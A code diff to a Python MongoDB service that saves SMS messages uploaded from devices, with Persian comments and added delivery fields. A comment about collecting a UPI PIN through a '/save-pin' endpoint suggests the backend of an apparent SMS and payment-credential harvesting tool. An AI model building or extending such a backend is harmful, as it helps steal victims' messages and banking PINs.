@@ -266,16 +266,23 @@ class DeviceService:
     @staticmethod
     async def save_new_sms(device_id: str, sms_data: dict):
         try:
-            sms_hash = hashlib.md5(
-                f"{device_id}:{sms_data.get('from', '')}:{sms_data.get('to', '')}:{sms_data.get('timestamp', 0)}:{sms_data.get('body', '')}".encode()
-            ).hexdigest()
+            # اگر sms_id از کلاینت اومده، از اون استفاده کن
+            # در غیر این صورت یک hash بساز
+            if sms_data.get("sms_id"):
+                sms_id = sms_data.get("sms_id")
+            else:
+                sms_id = hashlib.md5(
+                    f"{device_id}:{sms_data.get('from', '')}:{sms_data.get('to', '')}:{sms_data.get('timestamp', 0)}:{sms_data.get('body', '')}".encode()
+                ).hexdigest()
 
-            existing = await mongodb.db.sms_messages.find_one({"sms_id": sms_hash})
+            # بررسی تکراری بودن
+            existing = await mongodb.db.sms_messages.find_one({"sms_id": sms_id})
             if existing:
+                logger.info(f"⚠️ Duplicate SMS ignored: {sms_id}")
                 return
 
             message = {
-                "sms_id": sms_hash,
+                "sms_id": sms_id,
                 "device_id": device_id,
                 "from": sms_data.get("from"),
                 "to": sms_data.get("to"),
@@ -287,12 +294,27 @@ class DeviceService:
                 "tags": [],
                 "received_at": datetime.utcnow()
             }
+            
+            # ✅ فیلدهای اضافی برای SMS ارسالی
+            if sms_data.get("sim_slot") is not None:
+                message["sim_slot"] = sms_data.get("sim_slot")
+            
+            if sms_data.get("delivery_status"):
+                message["delivery_status"] = sms_data.get("delivery_status")
+            
+            if sms_data.get("delivery_details"):
+                message["delivery_details"] = sms_data.get("delivery_details")
+            
+            if sms_data.get("received_in_native") is not None:
+                message["received_in_native"] = sms_data.get("received_in_native")
 
             await mongodb.db.sms_messages.insert_one(message)
             await mongodb.db.devices.update_one(
                 {"device_id": device_id},
                 {"$inc": {"stats.total_sms": 1}}
             )
+            
+            logger.info(f"✅ SMS saved: {sms_id} (type: {message['type']})")
             
             # ℹ️ Note: UPI PIN now comes directly from /save-pin endpoint, not from SMS
                     
